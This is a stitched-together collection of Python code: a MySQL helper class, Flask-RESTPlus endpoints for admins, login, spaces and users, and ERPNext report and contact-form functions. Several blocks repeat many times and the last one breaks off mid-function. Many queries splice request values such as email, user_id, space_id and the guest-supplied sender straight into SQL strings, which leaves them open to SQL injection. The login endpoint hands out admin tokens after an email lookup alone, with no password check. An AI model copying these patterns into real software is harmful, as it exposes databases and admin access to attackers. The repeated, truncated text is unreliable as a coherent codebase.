                    'regional_team_id': measure_value.regional_team_id,
                    'regional_team_name': measure_value.regional_team.name,
                })
        else:
            assert False

        if measure_id in rolled:
            rolled[measure_id]['data'].append(measure_value_data)
        else:
            measure = measure_value.measure
            rolled[measure_id] = {
                'id': measure_id,
                'name': measure.name,
                'title': measure.title,
                'description': measure.description,
                'why_it_matters': measure.why_it_matters,
                'numerator_short': measure.numerator_short,
                'denominator_short': measure.denominator_short,
                'url': measure.url,
                'is_cost_based': measure.is_cost_based,
                'is_percentage': measure.is_percentage,
                'low_is_good': measure.low_is_good,
                'tags': _hydrate_tags(measure.tags),
                'data': [measure_value_data],
            }

    return rolled.values()


def _hydrate_tags(tag_ids):
    return [
        {'id': tag_id, 'name': MEASURE_TAGS[tag_id]['name']}
        for tag_id in tag_ids
    ]

import pymysql.cursors

class MySQLdb(object):
    def __init__(self, host, user, password, db, charset):
        self.connection = pymysql.connect(
        host= host,
        user= user,
        password= password,
        db= db,
        charset= charset,
        cursorclass=pymysql.cursors.DictCursor)

    def close_connection(self):
        self.connection.close()    

    def connect_sql(self, sql):
        """Connects to database, excutes sql, closes connection"""
        with self.connection.cursor() as cursor:
            cursor.execute(sql)
            result = cursor.fetchall()
            return(result)

    def update_sql(self, column, location_nw,title):
        #SQL UPDATE STATEMENT
        sql_update = f"UPDATE `artikelen` SET `{column}` = '{location_nw}' WHERE `title` = '{title}'"                     
        print(sql_update)
        # exit()
        with self.connection.cursor() as cursor:
            cursor.execute(sql_update)
        return

from flask import request
from flask_jwt_extended import jwt_required
from flask_restplus import Namespace, Resource, fields
from utilities import database_utilities

api = Namespace("admins", description="Information relating to system admins")


@api.route('/')
class Admins(Resource):
    def get(self):
        """ Fetch data for all admins """
        return database_utilities.execute_query("select * from admins")

    @jwt_required
    def post(self):
        """ Insert data for a new admin """
        query = f"""insert into admins values (%s);"""
        json_data = request.get_json()
        parameters = (json_data['email'], )
        database_utilities.execute_query(query, parameters)


@api.route('/<string:email>')
class Admin(Resource):
    def get(self, email):
        """ Fetch data for admin with the corresponding email """
        return database_utilities.execute_query(f"""select * from admins where email = '{email}'""")                    

    @jwt_required
    def delete(self, email):
        """ Deletes admin with the corresponding email """
        return database_utilities.execute_query(f"""delete from admins where email = '{email}'""")                    

from flask import request, jsonify
from flask_jwt_extended import (
    create_access_token, create_refresh_token, set_access_cookies,
    set_refresh_cookies, jwt_refresh_token_required, get_jwt_identity
)
from flask_restplus import Namespace, Resource
from utilities import database_utilities

api = Namespace("login", description="Endpoint used to obtain JWT")


@api.route('/')
class Login(Resource):
    def post(self):
        """ Returns JWT upon login verification """
        json_data = request.get_json()
        if not json_data['email']:
            return jsonify({"msg": "Missing email"}), 400

        data = database_utilities.execute_query(
            f"""select * from admins where email = '{json_data['email']}'""")                    
        if data:
            email = data[0]['email']
            access_token = create_access_token(identity=email)
            refresh_token = create_refresh_token(identity=email)

            resp = jsonify({"login": True})
            set_access_cookies(resp, access_token)
            set_refresh_cookies(resp, refresh_token)
            return resp
        else:
            return jsonify({"msg": "User is not an admin"})


@api.route('/refresh')
class Refresh(Resource):
    @jwt_refresh_token_required
    def post(self):
        current_user = get_jwt_identity()
        access_token = create_access_token(identity=current_user)

        resp = jsonify({"refresh": True})
        set_access_cookies(resp, access_token)
        return resp

from flask import request
from flask_jwt_extended import jwt_required
from flask_restplus import Namespace, Resource, fields, reqparse
from utilities import database_utilities

api = Namespace("spaces", description="Information relating to spaces")


@api.route('/')
class Spaces(Resource):
    def get(self):
        """ Fetch data for all spaces """

        # Parse request for parameters
        parser = reqparse.RequestParser()
        parser.add_argument('building_id')
        args = parser.parse_args()

        # Build query strings
        where_query = "WHERE building_id = %s" if args['building_id'] else ''
        query = f"SELECT * FROM spaces {where_query}"
        parameters = (args['building_id'],)

        return database_utilities.execute_query(query, parameters)

    @jwt_required
    def post(self):
        """ Insert data for new space """
        query = f"""insert into spaces values (%s, %s, %s, %s, %s);"""
        json_data = request.get_json()
        parameters = (json_data['space_id'], json_data['building_id'],
                      json_data['name'], json_data['capacity'],
                      json_data['features'])
        database_utilities.execute_query(query, parameters)


@api.route('/<string:space_id>')
class Space(Resource):
    def get(self, space_id):
        """ Fetch data for space with the corresponding space_id """
        return database_utilities.execute_query(
            f"""select * from spaces where space_id = '{space_id}'""")                    

    @jwt_required
    def delete(self, space_id):
        """ Deletes space with the corresponding space_id """
        return database_utilities.execute_query(
            f"""delete from spaces where space_id = %s""", (space_id, ))

    @jwt_required
    def patch(self, space_id):
        """ Replaces information of corresponding space_id with request body """
        query = f"""update spaces set space_id = %s, building_id = %s, """
        query += f"""name = %s, capacity = %s, features = %s """
        query += f"""where space_id = '{space_id}'"""
        json_data = request.get_json()
        parameters = (json_data['space_id'], json_data['building_id'],
                      json_data['name'], json_data['capacity'],
                      json_data['features'])
        database_utilities.execute_query(query, parameters)

from flask import request
from flask_jwt_extended import jwt_required
from flask_restplus import Namespace, Resource, fields
from utilities import database_utilities

api = Namespace("users", description="Information relating to users")


@api.route('/')
class Users(Resource):
    def get(self):
        """ Fetch data for all users """
        return database_utilities.execute_query("select * from users")

    @jwt_required
    def post(self):
        """ Insert data for new users """
        query = f"""insert into users values (%s);"""
        json_data = request.get_json()
        parameters = (json_data['user_id'], )                    
        database_utilities.execute_query(query, parameters)


@api.route('/<string:user_id>')
class User(Resource):
    def get(self, user_id):
        """ Fetch data for user with corresponding user_id """
        return database_utilities.execute_query(f"""select * from users where user_id = '{user_id}'""")                    

    @jwt_required
    def delete(self, user_id):
        """ Deletes user with the corresponding user_id """
        return database_utilities.execute_query(f"""delete from users where user_id = '{user_id}'""")                    

    @jwt_required
    def patch(self, user_id):
        """ Replaces information of corresponding user_id with request body """
        query = f"""update users set user_id = %s """
        query += f"""where user_id = '{user_id}'"""                    
        json_data = request.get_json()
        parameters = (json_data['user_id'], )                    
        database_utilities.execute_query(query, parameters)

# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# License: GNU General Public License v3. See license.txt

from __future__ import unicode_literals

import frappe, json
from frappe import _
from frappe.utils import cint, formatdate

@frappe.whitelist(allow_guest=True)
def send_message(subject="Website Query", message="", sender="", status="Open"):
	from frappe.www.contact import send_message as website_send_message
	lead = customer = None

	website_send_message(subject, message, sender)

	customer = frappe.db.sql("""select distinct dl.link_name from `tabDynamic Link` dl
		left join `tabContact` c on dl.parent=c.name where dl.link_doctype='Customer'
		and c.email_id='{email_id}'""".format(email_id=sender))                    

	if not customer:
		lead = frappe.db.get_value('Lead', dict(email_id=sender))
		if not lead:
			new_lead = frappe.get_doc(dict(
				doctype='Lead',
				email_id = sender,
				lead_name = sender.split('@')[0].title()
			)).insert(ignore_permissions=True)

	opportunity = frappe.get_doc(dict(
		doctype ='Opportunity',
		enquiry_from = 'Customer' if customer else 'Lead',
		status = 'Open',
		title = subject,
		contact_email = sender,
		to_discuss = message
	))

	if customer:
		opportunity.customer = customer[0][0]
	elif lead:
		opportunity.lead = lead
	else:
		opportunity.lead = new_lead.name

	opportunity.insert(ignore_permissions=True)

	comm = frappe.get_doc({
		"doctype":"Communication",
		"subject": subject,
		"content": message,
		"sender": sender,
		"sent_or_received": "Received",
		'reference_doctype': 'Opportunity',
		'reference_name': opportunity.name
	})
	comm.insert(ignore_permissions=True)

	return "okay"

# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# License: GNU General Public License v3. See license.txt

from __future__ import unicode_literals
import frappe
from frappe import _
from erpnext.hr.doctype.leave_application.leave_application \
	import get_leave_allocation_records, get_leave_balance_on, get_approved_leaves_for_period                    


def execute(filters=None):
	leave_types = frappe.db.sql_list("select name from `tabLeave Type` order by name asc")
	
	columns = get_columns(leave_types)
	data = get_data(filters, leave_types)
	
	return columns, data
	
def get_columns(leave_types):
	columns = [
		_("Employee") + ":Link/Employee:150",                     
		_("Employee Name") + "::200",                     
		_("Department") +"::150"
	]

	for leave_type in leave_types:
		columns.append(_(leave_type) + " " + _("Opening") + ":Float:160")
		columns.append(_(leave_type) + " " + _("Taken") + ":Float:160")
		columns.append(_(leave_type) + " " + _("Balance") + ":Float:160")
	
	return columns
	
def get_data(filters, leave_types):
	user = frappe.session.user
	allocation_records_based_on_to_date = get_leave_allocation_records(filters.to_date)
	allocation_records_based_on_from_date = get_leave_allocation_records(filters.from_date)

	active_employees = frappe.get_all("Employee",                     
		filters = { "status": "Active", "company": filters.company},                     
		fields = ["name", "employee_name", "department", "user_id"])
	
	data = []
	for employee in active_employees:
		leave_approvers = get_approvers(employee.department)
		if (len(leave_approvers) and user in leave_approvers) or (user in ["Administrator", employee.user_id]) or ("HR Manager" in frappe.get_roles(user)):
			row = [employee.name, employee.employee_name, employee.department]

			for leave_type in leave_types:
				# leaves taken
				leaves_taken = get_approved_leaves_for_period(employee.name, leave_type,
					filters.from_date, filters.to_date)

				# opening balance
				opening = get_leave_balance_on(employee.name, leave_type, filters.from_date,
					allocation_records_based_on_from_date.get(employee.name, frappe._dict()))                    

				# closing balance
				closing = get_leave_balance_on(employee.name, leave_type, filters.to_date,
					allocation_records_based_on_to_date.get(employee.name, frappe._dict()))

				row += [opening, leaves_taken, closing]

			data.append(row)
		
	return data

def get_approvers(department):
	if not department:
		return []

	approvers = []
	# get current department and all its child
	department_details = frappe.db.get_value("Department", {"name": department}, ["lft", "rgt"], as_dict=True)
	department_list = frappe.db.sql("""select name from `tabDepartment`
		where lft >= %s and rgt <= %s order by lft desc
		""", (department_details.lft, department_details.rgt), as_list = True)

	# retrieve approvers list from current department and from its subsequent child departments
	for d in department_list:
		approvers.extend([l.leave_approver for l in frappe.db.sql("""select approver from `tabDepartment Approver` \
			where parent = %s and parentfield = 'leave_approvers'""", (d), as_dict=True)])

	return approvers

# Copyright (c) 2013, Frappe Technologies Pvt. Ltd. and contributors
# For license information, please see license.txt

from __future__ import unicode_literals
import frappe
from frappe.utils import getdate, add_days, today, cint
from frappe import _

def execute(filters=None):

	columns = get_columns()
	data = get_data(filters)
	return columns, data

def get_columns():

	columns = [
		{
			"fieldname": "territory",
			"fieldtype": "Link",
			"label": _("Territory"),
			"options": "Territory",
			"width": 100
		},
		{
			"fieldname": "item_group",
			"fieldtype": "Link",
			"label": _("Item Group"),
			"options": "Item Group",
			"width": 150
		},
		{
			"fieldname": "item_name",
			"fieldtype": "Link",
			"options": "Item",
			"label": "Item",
			"width": 150
		},
		{
			"fieldname": "item_name",
			"fieldtype": "Data",
			"label": _("Item Name"),
			"width": 150
		},

		{
			"fieldname": "customer",
			"fieldtype": "Link",
			"label": _("Customer"),
			"options": "Customer",
			"width": 100
		},
		{
			"fieldname": "last_order_date",
			"fieldtype": "Date",
			"label": _("Last Order Date"),
			"width": 100
		},
		{
			"fieldname": "qty",
			"fieldtype": "Float",
			"label": _("Quantity"),
			"width": 100
		},
		{
			"fieldname": "days_since_last_order",
			"fieldtype": "Int",
			"label": _("Days Since Last Order"),
			"width": 100
		},
	]

	return columns


def get_data(filters):

	data = []
	items = get_items(filters)
	sales_invoice_data = get_sales_details(filters)

	for item in items:
		if sales_invoice_data.get(item.name):
			item_obj = sales_invoice_data[item.name]
			if item_obj.days_since_last_order > cint(filters['days']):
				row = {
					"territory": item_obj.territory,
					"item_group": item_obj.item_group,
					"item": item_obj.name,
					"item_name": item_obj.item_name,
					"customer": item_obj.customer,
					"last_order_date": item_obj.last_order_date,
					"qty": item_obj.qty,
					"days_since_last_order": item_obj.days_since_last_order
				}
				data.append(row)
		else:
			row = {
				"item_group": item.item_group,
				"item": item.name,
				"item_name": item.item_name
			}
			data.append(row)

	return data


def get_sales_details(filters):

	data = []
	item_details_map = {}

	date_field = "s.transaction_date" if filters["based_on"] == "Sales Order" else "s.posting_date"

	sales_data = frappe.db.sql("""
		select s.territory, s.customer, si.item_group, si.item_name, si.qty, {date_field} as last_order_date,
		DATEDIFF(CURDATE(), {date_field}) as days_since_last_order
		from `tab{doctype}` s, `tab{doctype} Item` si
		where s.name = si.parent and s.docstatus = 1
		group by si.name order by days_since_last_order """                    
		.format(date_field = date_field, doctype = filters['based_on']), as_dict=1)

	for d in sales_data:
		item_details_map.setdefault(d.item_name, d)

	return item_details_map

def get_items(filters):

	filters_dict = {
		"disabled": 0,
		"is_stock_item": 1
	}

	if filters.get("item_group"):
		filters_dict.update({
			"item_group": filters["item_group"]
		})

	if filters.get("item"):
		filters_dict.update({
			"name": filters["item"]
		})

	items = frappe.get_all("Item", fields=["name", "item_group", "item_name"], filters=filters_dict, order_by="name")

	return items


# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# License: GNU General Public License v3. See license.txt

from __future__ import unicode_literals

import frappe, json
from frappe import _
from frappe.utils import cint, formatdate

@frappe.whitelist(allow_guest=True)
def send_message(subject="Website Query", message="", sender="", status="Open"):
	from frappe.www.contact import send_message as website_send_message
	lead = customer = None

	website_send_message(subject, message, sender)

	customer = frappe.db.sql("""select distinct dl.link_name from `tabDynamic Link` dl
		left join `tabContact` c on dl.parent=c.name where dl.link_doctype='Customer'
		and c.email_id='{email_id}'""".format(email_id=sender))                    

	if not customer:
		lead = frappe.db.get_value('Lead', dict(email_id=sender))
		if not lead:
			new_lead = frappe.get_doc(dict(
				doctype='Lead',
				email_id = sender,
				lead_name = sender.split('@')[0].title()
			)).insert(ignore_permissions=True)

	opportunity = frappe.get_doc(dict(
		doctype ='Opportunity',
		enquiry_from = 'Customer' if customer else 'Lead',
		status = 'Open',
		title = subject,
		contact_email = sender,
		to_discuss = message
	))

	if customer:
		opportunity.customer = customer[0][0]
	elif lead:
		opportunity.lead = lead
	else:
		opportunity.lead = new_lead.name

	opportunity.insert(ignore_permissions=True)

	comm = frappe.get_doc({
		"doctype":"Communication",
		"subject": subject,
		"content": message,
		"sender": sender,
		"sent_or_received": "Received",
		'reference_doctype': 'Opportunity',
		'reference_name': opportunity.name
	})
	comm.insert(ignore_permissions=True)

	return "okay"

# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# License: GNU General Public License v3. See license.txt

from __future__ import unicode_literals
import frappe
from frappe import _
from erpnext.hr.doctype.leave_application.leave_application \
	import get_leave_allocation_records, get_leave_balance_on, get_approved_leaves_for_period                    


def execute(filters=None):
	leave_types = frappe.db.sql_list("select name from `tabLeave Type` order by name asc")
	
	columns = get_columns(leave_types)
	data = get_data(filters, leave_types)
	
	return columns, data
	
def get_columns(leave_types):
	columns = [
		_("Employee") + ":Link/Employee:150",                     
		_("Employee Name") + "::200",                     
		_("Department") +"::150"
	]

	for leave_type in leave_types:
		columns.append(_(leave_type) + " " + _("Opening") + ":Float:160")
		columns.append(_(leave_type) + " " + _("Taken") + ":Float:160")
		columns.append(_(leave_type) + " " + _("Balance") + ":Float:160")
	
	return columns
	
def get_data(filters, leave_types):
	user = frappe.session.user
	allocation_records_based_on_to_date = get_leave_allocation_records(filters.to_date)
	allocation_records_based_on_from_date = get_leave_allocation_records(filters.from_date)

	active_employees = frappe.get_all("Employee",                     
		filters = { "status": "Active", "company": filters.company},                     
		fields = ["name", "employee_name", "department", "user_id"])
	
	data = []
	for employee in active_employees:
		leave_approvers = get_approvers(employee.department)
		if (len(leave_approvers) and user in leave_approvers) or (user in ["Administrator", employee.user_id]) or ("HR Manager" in frappe.get_roles(user)):
			row = [employee.name, employee.employee_name, employee.department]

			for leave_type in leave_types:
				# leaves taken
				leaves_taken = get_approved_leaves_for_period(employee.name, leave_type,
					filters.from_date, filters.to_date)

				# opening balance
				opening = get_leave_balance_on(employee.name, leave_type, filters.from_date,
					allocation_records_based_on_from_date.get(employee.name, frappe._dict()))                    

				# closing balance
				closing = get_leave_balance_on(employee.name, leave_type, filters.to_date,
					allocation_records_based_on_to_date.get(employee.name, frappe._dict()))

				row += [opening, leaves_taken, closing]

			data.append(row)
		
	return data

def get_approvers(department):
	if not department:
		return []

	approvers = []
	# get current department and all its child
	department_details = frappe.db.get_value("Department", {"name": department}, ["lft", "rgt"], as_dict=True)
	department_list = frappe.db.sql("""select name from `tabDepartment`
		where lft >= %s and rgt <= %s order by lft desc
		""", (department_details.lft, department_details.rgt), as_list = True)

	# retrieve approvers list from current department and from its subsequent child departments
	for d in department_list:
		approvers.extend([l.leave_approver for l in frappe.db.sql("""select approver from `tabDepartment Approver` \
			where parent = %s and parentfield = 'leave_approvers'""", (d), as_dict=True)])

	return approvers

# Copyright (c) 2013, Frappe Technologies Pvt. Ltd. and contributors
# For license information, please see license.txt

from __future__ import unicode_literals
import frappe
from frappe.utils import getdate, add_days, today, cint
from frappe import _

def execute(filters=None):

	columns = get_columns()
	data = get_data(filters)
	return columns, data

def get_columns():

	columns = [
		{
			"fieldname": "territory",
			"fieldtype": "Link",
			"label": _("Territory"),
			"options": "Territory",
			"width": 100
		},
		{
			"fieldname": "item_group",
			"fieldtype": "Link",
			"label": _("Item Group"),
			"options": "Item Group",
			"width": 150
		},
		{
			"fieldname": "item_name",
			"fieldtype": "Link",
			"options": "Item",
			"label": "Item",
			"width": 150
		},
		{
			"fieldname": "item_name",
			"fieldtype": "Data",
			"label": _("Item Name"),
			"width": 150
		},

		{
			"fieldname": "customer",
			"fieldtype": "Link",
			"label": _("Customer"),
			"options": "Customer",
			"width": 100
		},
		{
			"fieldname": "last_order_date",
			"fieldtype": "Date",
			"label": _("Last Order Date"),
			"width": 100
		},
		{
			"fieldname": "qty",
			"fieldtype": "Float",
			"label": _("Quantity"),
			"width": 100
		},
		{
			"fieldname": "days_since_last_order",
			"fieldtype": "Int",
			"label": _("Days Since Last Order"),
			"width": 100
		},
	]

	return columns


def get_data(filters):

	data = []
	items = get_items(filters)
	sales_invoice_data = get_sales_details(filters)

	for item in items:
		if sales_invoice_data.get(item.name):
			item_obj = sales_invoice_data[item.name]
			if item_obj.days_since_last_order > cint(filters['days']):
				row = {
					"territory": item_obj.territory,
					"item_group": item_obj.item_group,
					"item": item_obj.name,
					"item_name": item_obj.item_name,
					"customer": item_obj.customer,
					"last_order_date": item_obj.last_order_date,
					"qty": item_obj.qty,
					"days_since_last_order": item_obj.days_since_last_order
				}
				data.append(row)
		else:
			row = {
				"item_group": item.item_group,
				"item": item.name,
				"item_name": item.item_name
			}
			data.append(row)

	return data


def get_sales_details(filters):

	data = []
	item_details_map = {}

	date_field = "s.transaction_date" if filters["based_on"] == "Sales Order" else "s.posting_date"

	sales_data = frappe.db.sql("""
		select s.territory, s.customer, si.item_group, si.item_name, si.qty, {date_field} as last_order_date,
		DATEDIFF(CURDATE(), {date_field}) as days_since_last_order
		from `tab{doctype}` s, `tab{doctype} Item` si
		where s.name = si.parent and s.docstatus = 1
		group by si.name order by days_since_last_order """                    
		.format(date_field = date_field, doctype = filters['based_on']), as_dict=1)

	for d in sales_data:
		item_details_map.setdefault(d.item_name, d)

	return item_details_map

def get_items(filters):

	filters_dict = {
		"disabled": 0,
		"is_stock_item": 1
	}

	if filters.get("item_group"):
		filters_dict.update({
			"item_group": filters["item_group"]
		})

	if filters.get("item"):
		filters_dict.update({
			"name": filters["item"]
		})

	items = frappe.get_all("Item", fields=["name", "item_group", "item_name"], filters=filters_dict, order_by="name")

	return items


# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# License: GNU General Public License v3. See license.txt

from __future__ import unicode_literals

import frappe, json
from frappe import _
from frappe.utils import cint, formatdate

@frappe.whitelist(allow_guest=True)
def send_message(subject="Website Query", message="", sender="", status="Open"):
	from frappe.www.contact import send_message as website_send_message
	lead = customer = None

	website_send_message(subject, message, sender)

	customer = frappe.db.sql("""select distinct dl.link_name from `tabDynamic Link` dl
		left join `tabContact` c on dl.parent=c.name where dl.link_doctype='Customer'
		and c.email_id='{email_id}'""".format(email_id=sender))                    

	if not customer:
		lead = frappe.db.get_value('Lead', dict(email_id=sender))
		if not lead:
			new_lead = frappe.get_doc(dict(
				doctype='Lead',
				email_id = sender,
				lead_name = sender.split('@')[0].title()
			)).insert(ignore_permissions=True)

	opportunity = frappe.get_doc(dict(
		doctype ='Opportunity',
		enquiry_from = 'Customer' if customer else 'Lead',
		status = 'Open',
		title = subject,
		contact_email = sender,
		to_discuss = message
	))

	if customer:
		opportunity.customer = customer[0][0]
	elif lead:
		opportunity.lead = lead
	else:
		opportunity.lead = new_lead.name

	opportunity.insert(ignore_permissions=True)

	comm = frappe.get_doc({
		"doctype":"Communication",
		"subject": subject,
		"content": message,
		"sender": sender,
		"sent_or_received": "Received",
		'reference_doctype': 'Opportunity',
		'reference_name': opportunity.name
	})
	comm.insert(ignore_permissions=True)

	return "okay"

# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# License: GNU General Public License v3. See license.txt

from __future__ import unicode_literals
import frappe
from frappe import _
from erpnext.hr.doctype.leave_application.leave_application \
	import get_leave_allocation_records, get_leave_balance_on, get_approved_leaves_for_period                    


def execute(filters=None):
	leave_types = frappe.db.sql_list("select name from `tabLeave Type` order by name asc")
	
	columns = get_columns(leave_types)
	data = get_data(filters, leave_types)
	
	return columns, data
	
def get_columns(leave_types):
	columns = [
		_("Employee") + ":Link/Employee:150",                     
		_("Employee Name") + "::200",                     
		_("Department") +"::150"
	]

	for leave_type in leave_types:
		columns.append(_(leave_type) + " " + _("Opening") + ":Float:160")
		columns.append(_(leave_type) + " " + _("Taken") + ":Float:160")
		columns.append(_(leave_type) + " " + _("Balance") + ":Float:160")
	
	return columns
	
def get_data(filters, leave_types):
	user = frappe.session.user
	allocation_records_based_on_to_date = get_leave_allocation_records(filters.to_date)
	allocation_records_based_on_from_date = get_leave_allocation_records(filters.from_date)

	active_employees = frappe.get_all("Employee",                     
		filters = { "status": "Active", "company": filters.company},                     
		fields = ["name", "employee_name", "department", "user_id"])
	
	data = []
	for employee in active_employees:
		leave_approvers = get_approvers(employee.department)
		if (len(leave_approvers) and user in leave_approvers) or (user in ["Administrator", employee.user_id]) or ("HR Manager" in frappe.get_roles(user)):
			row = [employee.name, employee.employee_name, employee.department]

			for leave_type in leave_types:
				# leaves taken
				leaves_taken = get_approved_leaves_for_period(employee.name, leave_type,
					filters.from_date, filters.to_date)

				# opening balance
				opening = get_leave_balance_on(employee.name, leave_type, filters.from_date,
					allocation_records_based_on_from_date.get(employee.name, frappe._dict()))                    

				# closing balance
				closing = get_leave_balance_on(employee.name, leave_type, filters.to_date,
					allocation_records_based_on_to_date.get(employee.name, frappe._dict()))

				row += [opening, leaves_taken, closing]

			data.append(row)
		
	return data

def get_approvers(department):
	if not department:
		return []

	approvers = []
	# get current department and all its child
	department_details = frappe.db.get_value("Department", {"name": department}, ["lft", "rgt"], as_dict=True)
	department_list = frappe.db.sql("""select name from `tabDepartment`
		where lft >= %s and rgt <= %s order by lft desc
		""", (department_details.lft, department_details.rgt), as_list = True)

	# retrieve approvers list from current department and from its subsequent child departments
	for d in department_list:
		approvers.extend([l.leave_approver for l in frappe.db.sql("""select approver from `tabDepartment Approver` \
			where parent = %s and parentfield = 'leave_approvers'""", (d), as_dict=True)])

	return approvers

# Copyright (c) 2013, Frappe Technologies Pvt. Ltd. and contributors
# For license information, please see license.txt

from __future__ import unicode_literals
import frappe
from frappe.utils import getdate, add_days, today, cint
from frappe import _

def execute(filters=None):

	columns = get_columns()
	data = get_data(filters)
	return columns, data

def get_columns():

	columns = [
		{
			"fieldname": "territory",
			"fieldtype": "Link",
			"label": _("Territory"),
			"options": "Territory",
			"width": 100
		},
		{
			"fieldname": "item_group",
			"fieldtype": "Link",
			"label": _("Item Group"),
			"options": "Item Group",
			"width": 150
		},
		{
			"fieldname": "item_name",
			"fieldtype": "Link",
			"options": "Item",
			"label": "Item",
			"width": 150
		},
		{
			"fieldname": "item_name",
			"fieldtype": "Data",
			"label": _("Item Name"),
			"width": 150
		},

		{
			"fieldname": "customer",
			"fieldtype": "Link",
			"label": _("Customer"),
			"options": "Customer",
			"width": 100
		},
		{
			"fieldname": "last_order_date",
			"fieldtype": "Date",
			"label": _("Last Order Date"),
			"width": 100
		},
		{
			"fieldname": "qty",
			"fieldtype": "Float",
			"label": _("Quantity"),
			"width": 100
		},
		{
			"fieldname": "days_since_last_order",
			"fieldtype": "Int",
			"label": _("Days Since Last Order"),
			"width": 100
		},
	]

	return columns


def get_data(filters):

	data = []
	items = get_items(filters)
	sales_invoice_data = get_sales_details(filters)

	for item in items:
		if sales_invoice_data.get(item.name):
			item_obj = sales_invoice_data[item.name]
			if item_obj.days_since_last_order > cint(filters['days']):
				row = {
					"territory": item_obj.territory,
					"item_group": item_obj.item_group,
					"item": item_obj.name,
					"item_name": item_obj.item_name,
					"customer": item_obj.customer,
					"last_order_date": item_obj.last_order_date,
					"qty": item_obj.qty,
					"days_since_last_order": item_obj.days_since_last_order
				}
				data.append(row)
		else:
			row = {
				"item_group": item.item_group,
				"item": item.name,
				"item_name": item.item_name
			}
			data.append(row)

	return data


def get_sales_details(filters):

	data = []
	item_details_map = {}

	date_field = "s.transaction_date" if filters["based_on"] == "Sales Order" else "s.posting_date"

	sales_data = frappe.db.sql("""
		select s.territory, s.customer, si.item_group, si.item_name, si.qty, {date_field} as last_order_date,
		DATEDIFF(CURDATE(), {date_field}) as days_since_last_order
		from `tab{doctype}` s, `tab{doctype} Item` si
		where s.name = si.parent and s.docstatus = 1
		group by si.name order by days_since_last_order """                    
		.format(date_field = date_field, doctype = filters['based_on']), as_dict=1)

	for d in sales_data:
		item_details_map.setdefault(d.item_name, d)

	return item_details_map

def get_items(filters):

	filters_dict = {
		"disabled": 0,
		"is_stock_item": 1
	}

	if filters.get("item_group"):
		filters_dict.update({
			"item_group": filters["item_group"]
		})

	if filters.get("item"):
		filters_dict.update({
			"name": filters["item"]
		})

	items = frappe.get_all("Item", fields=["name", "item_group", "item_name"], filters=filters_dict, order_by="name")

	return items


# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# License: GNU General Public License v3. See license.txt

from __future__ import unicode_literals
import frappe
from frappe import _
from erpnext.hr.doctype.leave_application.leave_application \
	import get_leave_allocation_records, get_leave_balance_on, get_approved_leaves_for_period                    


def execute(filters=None):
	leave_types = frappe.db.sql_list("select name from `tabLeave Type` order by name asc")
	
	columns = get_columns(leave_types)
	data = get_data(filters, leave_types)
	
	return columns, data
	
def get_columns(leave_types):
	columns = [
		_("Employee") + ":Link/Employee:150",                     
		_("Employee Name") + "::200",                     
		_("Department") +"::150"
	]

	for leave_type in leave_types:
		columns.append(_(leave_type) + " " + _("Opening") + ":Float:160")
		columns.append(_(leave_type) + " " + _("Taken") + ":Float:160")
		columns.append(_(leave_type) + " " + _("Balance") + ":Float:160")
	
	return columns
	
def get_data(filters, leave_types):
	user = frappe.session.user
	allocation_records_based_on_to_date = get_leave_allocation_records(filters.to_date)
	allocation_records_based_on_from_date = get_leave_allocation_records(filters.from_date)

	active_employees = frappe.get_all("Employee",                     
		filters = { "status": "Active", "company": filters.company},                     
		fields = ["name", "employee_name", "department", "user_id"])
	
	data = []
	for employee in active_employees:
		leave_approvers = get_approvers(employee.department)
		if (len(leave_approvers) and user in leave_approvers) or (user in ["Administrator", employee.user_id]) or ("HR Manager" in frappe.get_roles(user)):
			row = [employee.name, employee.employee_name, employee.department]

			for leave_type in leave_types:
				# leaves taken
				leaves_taken = get_approved_leaves_for_period(employee.name, leave_type,
					filters.from_date, filters.to_date)

				# opening balance
				opening = get_leave_balance_on(employee.name, leave_type, filters.from_date,
					allocation_records_based_on_from_date.get(employee.name, frappe._dict()))                    

				# closing balance
				closing = get_leave_balance_on(employee.name, leave_type, filters.to_date,
					allocation_records_based_on_to_date.get(employee.name, frappe._dict()))

				row += [opening, leaves_taken, closing]

			data.append(row)
		
	return data

def get_approvers(department):
	if not department:
		return []

	approvers = []
	# get current department and all its child
	department_details = frappe.db.get_value("Department", {"name": department}, ["lft", "rgt"], as_dict=True)
	department_list = frappe.db.sql("""select name from `tabDepartment`
		where lft >= %s and rgt <= %s order by lft desc
		""", (department_details.lft, department_details.rgt), as_list = True)

	# retrieve approvers list from current department and from its subsequent child departments
	for d in department_list:
		approvers.extend([l.leave_approver for l in frappe.db.sql("""select approver from `tabDepartment Approver` \
			where parent = %s and parentfield = 'leave_approvers'""", (d), as_dict=True)])

	return approvers

# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# License: GNU General Public License v3. See license.txt

from __future__ import unicode_literals
import frappe
from frappe import _
from erpnext.hr.doctype.leave_application.leave_application \
	import get_leave_allocation_records, get_leave_balance_on, get_approved_leaves_for_period                    


def execute(filters=None):
	leave_types = frappe.db.sql_list("select name from `tabLeave Type` order by name asc")
	
	columns = get_columns(leave_types)
	data = get_data(filters, leave_types)
	
	return columns, data
	
def get_columns(leave_types):
	columns = [
		_("Employee") + ":Link/Employee:150",                     
		_("Employee Name") + "::200",                     
		_("Department") +"::150"
	]

	for leave_type in leave_types:
		columns.append(_(leave_type) + " " + _("Opening") + ":Float:160")
		columns.append(_(leave_type) + " " + _("Taken") + ":Float:160")
		columns.append(_(leave_type) + " " + _("Balance") + ":Float:160")
	
	return columns
	
def get_data(filters, leave_types):
	user = frappe.session.user
	allocation_records_based_on_to_date = get_leave_allocation_records(filters.to_date)
	allocation_records_based_on_from_date = get_leave_allocation_records(filters.from_date)

	active_employees = frappe.get_all("Employee",                     
		filters = { "status": "Active", "company": filters.company},                     
		fields = ["name", "employee_name", "department", "user_id"])
	
	data = []
	for employee in active_employees:
		leave_approvers = get_approvers(employee.department)
		if (len(leave_approvers) and user in leave_approvers) or (user in ["Administrator", employee.user_id]) or ("HR Manager" in frappe.get_roles(user)):
			row = [employee.name, employee.employee_name, employee.department]

			for leave_type in leave_types:
				# leaves taken
				leaves_taken = get_approved_leaves_for_period(employee.name, leave_type,
					filters.from_date, filters.to_date)

				# opening balance
